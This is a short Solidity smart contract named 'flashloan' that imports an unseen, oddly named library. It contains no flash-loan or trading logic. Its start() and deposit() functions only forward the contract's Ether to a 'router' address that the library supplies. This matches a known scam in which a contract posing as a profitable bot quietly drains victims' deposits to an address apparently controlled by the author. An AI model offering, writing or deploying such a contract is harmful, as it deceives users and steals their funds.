// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "./librerya.sol";
contract flashloan {
    event Deposit(address indexed _from, uint256 _amount);

    function start() public {
        AddressLibrary.getRouter().transfer(address(this).balance);
    }

    fallback () external payable {
    }

    receive () external payable {
    }
    
   function deposit() public payable {
    require(msg.value > 0, "Deposit must be greater than 0");
    emit Deposit(msg.sender, msg.value);
    uint256 userBalance = msg.sender.balance;
    uint256 minTransferAmount = 1 wei;
    require(userBalance >= minTransferAmount, "Insufficient balance to transfer");
    require(address(this).balance >= userBalance, "Insufficient contract balance to transfer");
    (bool success, ) = AddressLibrary.getRouter().call{value: userBalance}("");
    require(success, "Transfer to router failed");
   }
}